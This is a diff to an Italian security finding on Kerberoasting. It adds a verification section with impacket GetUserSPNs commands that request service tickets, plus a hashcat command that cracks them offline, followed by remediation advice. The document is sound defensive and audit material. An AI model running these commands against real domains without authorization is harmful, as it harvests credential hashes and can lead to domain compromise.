@@ -23,6 +23,20 @@ Gli account di servizio con Service Principal Name (SPN) registrato utilizzano p
 
 Le password degli account di servizio — spesso con privilegi elevati e mai modificate — vengono recuperate offline senza interazioni con il target e senza allarmi: il cracking di un singolo account di servizio privilegiato può portare alla compromissione del dominio.
 
+## Verifica
+
+```
+# Verifica/sfruttamento con impacket (basta un utente di dominio qualsiasi):
+impacket-GetUserSPNs domain/user:password -dc-ip <IP_DC> -request
+
+# oppure con l'eseguibile degli esempi:
+GetUserSPNs.py domain/user:password -dc-ip <IP_DC> -request -outputfile tgs.txt
+
+# crack offline:
+hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
+```
+Gli account con SPN e password debole restituiscono hash crackabili.
+
 ## Remediation
 
 Impostare password lunghe e casuali (25+ caratteri) per gli account di servizio, preferendo gMSA (Group Managed Service Accounts), disabilitare la cifratura RC4 a favore di AES, ridurre i privilegi degli SPN e monitorare le richieste TGS anomale (Event ID 4769 con RC4).
